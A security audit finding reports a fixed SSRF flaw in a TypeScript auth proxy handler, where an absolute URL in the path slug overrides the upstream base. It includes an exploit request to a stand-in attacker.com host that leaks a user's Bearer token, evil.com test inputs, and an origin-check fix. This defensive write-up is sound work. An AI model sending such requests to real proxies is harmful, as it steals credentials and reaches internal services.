# BUG-001 — SSRF via unvalidated slug in proxy handler

**Severity:** HIGH  
**Category:** SSRF  
**Confidence:** 9/10  
**Source:** Security review 2026-06-28  
**Status:** FIXED — 2026-06-28

## Location

`src/server/handler.ts:49–53` (`buildUpstreamUrl`)  
`src/server/handler.ts:80–81` (slug join → URL construction)

## Root Cause

`buildUpstreamUrl` constructs the upstream fetch URL using `new URL(path, base)` where `path` is `context.params.slug.join('/')` — fully user-controlled. The Web API `URL` constructor ignores `base` when `path` contains an absolute URL (i.e., includes a scheme). A request to `/api/auth/https://attacker.com/steal` resolves `slug = ['https:', '', 'attacker.com', 'steal']`, joins to `'https://attacker.com/steal'`, and the proxy fetches that URL directly.

```ts
// handler.ts:80–81
const path = context.params.slug.join('/');
const upstreamUrl = buildUpstreamUrl(baseUrl, path, context.request.url);

// handler.ts:51
const upstreamUrl = new URL(path, normalizedBase + '/');  // base ignored when path is absolute
```

## Exploit Scenario

```
GET /api/auth/https://attacker.com/steal HTTP/1.1
Authorization: Bearer <user-token>
```

Server fetches `https://attacker.com/steal` with proxied headers `authorization`, `user-agent`, `referer`, `content-type`, `origin`. The user's Bearer token is exfiltrated. Additionally, the proxy can be used to reach internal services (cloud metadata endpoints, internal databases, etc.).

## Fix Plan

After constructing `upstreamUrl`, assert its origin matches the configured `baseUrl` origin before calling `fetch`. Return 400 if the check fails.

```ts
function buildUpstreamUrl(baseUrl: string, path: string, originalUrl: string): URL {
  const normalizedBase = baseUrl.replace(/\/+$/, '');
  const baseOrigin = new URL(normalizedBase).origin;
  const upstreamUrl = new URL(path, normalizedBase + '/');
  upstreamUrl.search = new URL(originalUrl).search;

  if (upstreamUrl.origin !== baseOrigin) {
    throw new Error(`Blocked upstream request to disallowed host: ${upstreamUrl.origin}`);
  }

  return upstreamUrl;
}
```

The caller in `handler` should catch this and return `Response.json({ error: 'Invalid path' }, { status: 400 })`.

## Tests to Add

- `slug = ['https:', '', 'evil.com', 'steal']` → expect 400 (not a proxy request to evil.com)
- `slug = ['//evil.com', 'steal']` → expect 400
- `slug = ['get-session']` → expect normal proxying (regression)
